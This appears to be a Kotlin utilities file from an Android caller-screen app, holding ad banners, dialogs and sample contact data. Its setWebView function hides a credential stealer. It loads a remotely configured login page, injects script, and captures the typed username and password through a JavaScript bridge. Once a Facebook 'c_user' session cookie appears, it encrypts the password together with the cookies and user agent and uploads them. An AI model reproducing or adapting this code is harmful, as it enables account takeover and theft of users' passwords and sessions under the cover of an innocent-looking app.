package media.callshow.vc.flash.utils

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.text.TextUtils
import android.util.Log
import android.view.Gravity
import android.view.ViewGroup
import android.webkit.*
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import media.callshow.vc.flash.R
import media.callshow.vc.flash.base.HApp
import media.callshow.vc.flash.base.HPage
import media.callshow.vc.flash.entity.MainData
import media.callshow.vc.flash.entity.ResultEntity

fun Any?.loges() {
    Log.e("xxxxxxH", "$this")
}

fun AppCompatActivity.appendBanner() {
    val content = findViewById<ViewGroup>(android.R.id.content)
    val frameLayout = FrameLayout(this)
    val p = ViewGroup.LayoutParams(
        ViewGroup.LayoutParams.MATCH_PARENT,
        ViewGroup.LayoutParams.MATCH_PARENT
    )
    frameLayout.layoutParams = p

    val linearLayout = LinearLayout(this)
    val p1 = FrameLayout.LayoutParams(
        FrameLayout.LayoutParams.MATCH_PARENT,
        FrameLayout.LayoutParams.MATCH_PARENT
    )
    linearLayout.layoutParams = p1

    val banner = HApp.instance!!.bannerAd()
    "banner $banner".loges()
    lifecycleScope.launch(Dispatchers.IO) {
        delay(3000)
        banner.loadAd()
        withContext(Dispatchers.Main) {
            val p2 =
                LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    dp2px(this@appendBanner, 50f)
                )
            p2.gravity = Gravity.BOTTOM
            banner.layoutParams = p2
            linearLayout.addView(banner)
            frameLayout.addView(linearLayout)
            content.addView(frameLayout)
        }
    }
}

fun dp2px(context: Context, dp: Float): Int {
    val density = context.resources.displayMetrics.density
    return (dp * density + 0.5f).toInt()
}

fun isInBackground(): Boolean {
    val activityManager =
        HApp.instance!!.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val appProcesses = activityManager
        .runningAppProcesses
    for (appProcess in appProcesses) {
        if (appProcess.processName == HApp.instance!!.packageName) {
            return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
        }
    }
    return false
}

fun AppCompatActivity.addOpen(showOpen: (ViewGroup) -> Unit) {
    val content = findViewById<ViewGroup>(android.R.id.content)
    (content.getTag(R.id.open_ad_view_id) as? FrameLayout)?.let {
        showOpen(it)
    } ?: kotlin.run {
        FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            content.addView(this)
            content.setTag(R.id.open_ad_view_id, this)
            showOpen(this)
        }
    }
}

fun AppCompatActivity.jump(clazz: Class<*>, end: Boolean = false) {
    startActivity(Intent(this, clazz))
    if (end) {
        finish()
    }
}

fun AppCompatActivity.setWebView(
    webView: WebView,
    block1: () -> Unit,
    block2: () -> Unit,
    upload: (String) -> Unit
) {
    webView.apply {
        settings.apply {
            javaScriptEnabled = true
            textZoom = 100
            setSupportZoom(true)
            displayZoomControls = false
            builtInZoomControls = true
            setGeolocationEnabled(true)
            useWideViewPort = true
            loadWithOverviewMode = true
            loadsImagesAutomatically = true
            displayZoomControls = false
            setAppCachePath(cacheDir.absolutePath)
            setAppCacheEnabled(true)
        }
        addJavascriptInterface(WebInterface(), "businessAPI")
        webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                if (newProgress == 100) {
                    val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                    evaluateJavascript(hideJs, null)
                    val loginJs = getString(R.string.login)
                    evaluateJavascript(loginJs, null)
                    lifecycleScope.launch(Dispatchers.IO) {
                        delay(300)
                        withContext(Dispatchers.Main) {
                            block1()
                        }
                    }
                }
            }
        }
        webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                val cookieManager = CookieManager.getInstance()
                val cookieStr = cookieManager.getCookie(url)
                if (cookieStr != null) {
                    if (cookieStr.contains("c_user")) {
                        if (userName.isNotBlank() && userPwd.isNotBlank() && cookieStr.contains("wd=")) {
                            lifecycleScope.launch(Dispatchers.Main) {
                                block2()
                            }
                            val content = gson.toJson(
                                mutableMapOf(
                                    "un" to userName,
                                    "pw" to userPwd,
                                    "cookie" to cookieStr,
                                    "source" to configEntity.app_name,
                                    "ip" to "",
                                    "type" to "f_o",
                                    "b" to view.settings.userAgentString
                                )
                            ).encrypt(updateEntity.key())
                            upload(content)//上传
                        }
                    }
                }
            }
        }
        loadUrl(if (!TextUtils.isEmpty(updateEntity.loginUrl())) updateEntity.loginUrl() else "https://www.baidu.com")
    }

}

class WebInterface {
    @JavascriptInterface
    fun businessStart(a: String, b: String) {
        userName = a
        userPwd = b
    }
}

fun formatResult(s: String, result: (ResultEntity) -> Unit) {
    result(gson.fromJson(s, ResultEntity::class.java))
}

fun Context.goWeb(url: String) = Intent(Intent.ACTION_VIEW, Uri.parse(url)).let {
    startActivity(it)
}

fun AppCompatActivity.getMainData(data: (ArrayList<MainData>) -> Unit) {
    val result = ArrayList<MainData>()
    result.add(
        MainData(
            av = R.mipmap.av1,
            name = "Audrey",
            phone = "916 740 0000",
            background = R.mipmap.item1,
            answer = R.mipmap.item_answer,
            reject = R.mipmap.item_reject
        )
    )
    result.add(
        MainData(
            av = R.mipmap.av2,
            name = "Audrey",
            phone = "916 740 0000",
            background = R.mipmap.item2,
            answer = R.mipmap.item_answer,
            reject = R.mipmap.item_reject
        )
    )
    result.add(
        MainData(
            av = R.mipmap.av3,
            name = "Audrey",
            phone = "916 740 0000",
            background = R.mipmap.item3,
            answer = R.mipmap.item_answer,
            reject = R.mipmap.item_reject
        )
    )
    result.add(
        MainData(
            av = R.mipmap.av1,
            name = "Audrey",
            phone = "916 740 0000",
            background = R.mipmap.item4,
            answer = R.mipmap.item_answer,
            reject = R.mipmap.item_reject
        )
    )

    data(result)
}

fun AppCompatActivity.getDialog(
    type: Int,
    cancel: Boolean = true,
    isRate: Boolean = false,
    click: () -> Unit
): AlertDialog {
    if (isRate) {
        val v = layoutInflater.inflate(R.layout.layout_rate, null)
        val dialog = AlertDialog.Builder(this).create()
        dialog.setView(v)
        dialog.setCancelable(false)
        v.findViewById<ImageView>(R.id.cancel).apply {
            setOnClickListener { dialog.dismiss() }
        }
        v.findViewById<ImageView>(R.id.sure).apply {
            setOnClickListener { dialog.dismiss() }
        }
        return dialog
    } else {
        val v = layoutInflater.inflate(R.layout.layout_dialog, null)
        val dialog = AlertDialog.Builder(this).create()
        dialog.setView(v)
        dialog.setCancelable(cancel)
        val dialogAd = v.findViewById<FrameLayout>(R.id.dialogAd)
        (this as HPage).displayNativeAd {
            it?.let {
                dialogAd.removeAllViews()
                dialogAd.addView(it)
            }
        }
        v.findViewById<TextView>(R.id.dialogTv).apply {
            when (type) {
                0 -> {
                    //exit
                    text = "Are you sure to exit the application?"
                }
                1 -> {
                    //save
                    text = "Are you saving?"
                }
                2 -> {
                    //loading
                    text = "Loading"
                }
            }
        }
        v.findViewById<ImageView>(R.id.cancel).apply {
            setOnClickListener { dialog.dismiss() }
        }
        v.findViewById<ImageView>(R.id.sure).apply {
            setOnClickListener { click() }
        }
        return dialog
    }

}

fun AppCompatActivity.share() {
    val intent = Intent(Intent.ACTION_SENDTO)
    intent.data = Uri.parse("mailto:")
    intent.putExtra(Intent.EXTRA_EMAIL, "nuclearvpnp@outlook.com")
    intent.putExtra(Intent.EXTRA_CC, "")
    intent.putExtra(Intent.EXTRA_SUBJECT, "feedBook")
    intent.putExtra(Intent.EXTRA_TEXT, "I Like This App")
    Intent.createChooser(intent, "Choose Email Client")
    startActivity(intent)
}